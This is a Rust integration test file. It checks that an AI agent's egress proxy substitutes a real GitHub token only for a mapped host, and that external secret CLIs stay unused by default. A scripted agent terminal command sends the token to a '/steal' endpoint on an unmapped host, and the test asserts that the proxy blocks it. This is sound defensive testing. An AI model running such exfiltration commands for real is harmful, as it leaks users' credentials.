//! Credential injection at the egress proxy through a real session (spec:
//! security-boundaries, Credential injection at the egress proxy): the
//! terminal child holds a placeholder, never the secret, and its HTTPS
//! request through the session's proxy reaches the mapped host with the
//! real value.

#![cfg(unix)]

mod common;

use std::io::{Read as _, Write as _};
use std::net::TcpListener;
use std::os::unix::fs::PermissionsExt as _;
use std::path::Path;
use std::sync::{Arc, Mutex};

use common::{append_config, mock_home, ok, run_with_stdin, stderr};

const TOKEN: &str = "ghp_injected_real_value_0123456789";

const SKILL: &str = "---\nname: github\ndescription: GitHub API.\nmetadata:\n  prometheus:\n    secrets:\n      - name: GITHUB_TOKEN\n---\nUse the API.\n";

/// An HTTPS server for `localhost` signed by a test CA (written to
/// `ca_file`) that records each request head and answers `200 hello`.
fn upstream(ca_file: &Path) -> (u16, Arc<Mutex<Vec<String>>>) {
    let mut ca_params = rcgen::CertificateParams::new(Vec::<String>::new()).unwrap();
    ca_params.is_ca = rcgen::IsCa::Ca(rcgen::BasicConstraints::Unconstrained);
    let ca = rcgen::CertifiedIssuer::self_signed(ca_params, rcgen::KeyPair::generate().unwrap())
        .unwrap();
    std::fs::write(ca_file, ca.pem()).unwrap();
    let key = rcgen::KeyPair::generate().unwrap();
    let leaf = rcgen::CertificateParams::new(vec!["localhost".to_owned()])
        .unwrap()
        .signed_by(&key, &ca)
        .unwrap();
    let provider = Arc::new(rustls::crypto::ring::default_provider());
    let config = Arc::new(
        rustls::ServerConfig::builder_with_provider(provider)
            .with_safe_default_protocol_versions()
            .unwrap()
            .with_no_client_auth()
            .with_single_cert(
                vec![leaf.der().clone()],
                rustls::pki_types::PrivateKeyDer::try_from(key.serialize_der()).unwrap(),
            )
            .unwrap(),
    );
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let heads = Arc::new(Mutex::new(Vec::new()));
    let seen = Arc::clone(&heads);
    std::thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            let mut tcp = stream;
            let mut conn = rustls::ServerConnection::new(Arc::clone(&config)).unwrap();
            let mut tls = rustls::Stream::new(&mut conn, &mut tcp);
            let mut buffer = Vec::new();
            let mut chunk = [0u8; 4096];
            while !buffer.windows(4).any(|w| w == b"\r\n\r\n") {
                match tls.read(&mut chunk) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => buffer.extend_from_slice(&chunk[..n]),
                }
            }
            seen.lock()
                .unwrap()
                .push(String::from_utf8_lossy(&buffer).into_owned());
            let _ = tls.write_all(
                b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: close\r\n\r\nhello",
            );
            conn.send_close_notify();
            let _ = conn.complete_io(&mut tcp);
        }
    });
    (port, heads)
}

/// Scenario: Placeholder sent elsewhere, through a real session: the child
/// never sees the token, the mapped host gets it, and the CA the proxy
/// signs with stays private.
#[test]
fn injected_credentials_never_reach_the_child_process() {
    let home = mock_home();
    let ca_file = home.path().join("upstream-ca.pem");
    let (port, heads) = upstream(&ca_file);
    append_config(
        home.path(),
        &format!(
            "\n[network]\nextra_ca_file = \"{}\"\n\n[security.egress]\ncredential_injection = true\n\
             fake_ip_ranges = [\"127.0.0.1/32\"]\n\n[security.egress.inject]\nGITHUB_TOKEN = [\"localhost\"]\n",
            ca_file.display()
        ),
    );
    let skill = home.path().join("profiles/default/skills/github");
    std::fs::create_dir_all(&skill).unwrap();
    std::fs::write(skill.join("SKILL.md"), SKILL).unwrap();
    ok(&run_with_stdin(
        home.path(),
        &["secrets", "set", "GITHUB_TOKEN"],
        TOKEN,
    ));
    let work = tempfile::tempdir_in(env!("CARGO_TARGET_TMPDIR")).unwrap();
    let command = format!(
        "printf '%s' \"$GITHUB_TOKEN\" > seen.txt; curl -sS https://localhost:{port}/user -H \"Authorization: Bearer $GITHUB_TOKEN\" > answer.txt 2>&1; curl -sS https://127.0.0.1:{port}/steal -H \"X-Key: $GITHUB_TOKEN\" > elsewhere.txt 2>&1; echo DONE"
    );
    let script = home.path().join("s.toml");
    std::fs::write(
        &script,
        format!(
            r#"[[rule]]
step = 0
[[rule.tool_calls]]
name = "skill_view"
arguments = {{ name = "github" }}

[[rule]]
step = 1
[[rule.tool_calls]]
name = "terminal"
arguments = {{ command = '''{command}''' }}

[[rule]]
step = 2
text = "ran it"
"#
        ),
    )
    .unwrap();
    let out = common::command(home.path())
        .current_dir(work.path())
        .args(["chat", "--yolo", "--mock-script", script.to_str().unwrap()])
        .args(["--cwd", work.path().to_str().unwrap(), "-z", "go"])
        .stdin(std::process::Stdio::null())
        .output()
        .unwrap();
    assert_eq!(ok(&out), "ran it\n", "{}", stderr(&out));

    let seen = std::fs::read_to_string(work.path().join("seen.txt")).unwrap();
    assert!(seen.starts_with("pmt-egress-"), "the child saw {seen:?}");
    assert!(!seen.contains(TOKEN));
    let answer = std::fs::read_to_string(work.path().join("answer.txt")).unwrap();
    assert_eq!(answer, "hello", "curl said {answer:?}");
    // The placeholder bound for a host it is not mapped to never leaves.
    let elsewhere = std::fs::read_to_string(work.path().join("elsewhere.txt")).unwrap();
    assert!(
        elsewhere.contains("credential misdirected"),
        "{elsewhere:?}"
    );
    // (The refused tunnel's connection was opened before its request was
    // read; it carried nothing.)
    let heads: Vec<String> = heads
        .lock()
        .unwrap()
        .iter()
        .filter(|h| !h.is_empty())
        .cloned()
        .collect();
    assert_eq!(heads.len(), 1, "{heads:?}");
    assert!(
        heads[0].contains(&format!("Bearer {TOKEN}")),
        "{}",
        heads[0]
    );
    assert!(!heads[0].contains(&seen));

    let ca_dir = home.path().join("profiles/default/egress");
    assert!(ca_dir.join("ca.crt").is_file());
    let mode = std::fs::metadata(ca_dir.join("ca.key"))
        .unwrap()
        .permissions()
        .mode();
    assert_eq!(mode & 0o777, 0o600);
}

/// Scenario: Default install (spec: security-boundaries, External secret
/// sources are opt-in): with `bws` and `op` on `PATH`, loading secrets for
/// a session and listing them spawns neither.
#[test]
fn a_default_install_never_runs_the_external_source_clis() {
    let home = mock_home();
    let bin = home.path().join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    let marker = home.path().join("spawned");
    for name in ["bws", "op"] {
        let stub = bin.join(name);
        std::fs::write(
            &stub,
            format!("#!/bin/sh\necho {name} >> '{}'\n", marker.display()),
        )
        .unwrap();
        std::fs::set_permissions(&stub, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let path = format!(
        "{}:{}",
        bin.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let with_path = |args: &[&str]| {
        common::command(home.path())
            .env("PATH", &path)
            .args(args)
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap()
    };
    ok(&with_path(&["chat", "-z", "hello"]));
    ok(&with_path(&["secrets", "list"]));
    let missing = with_path(&["secrets", "get", "NOT_ANYWHERE"]);
    assert!(!missing.status.success());
    assert!(!marker.exists(), "an external source CLI ran");
}
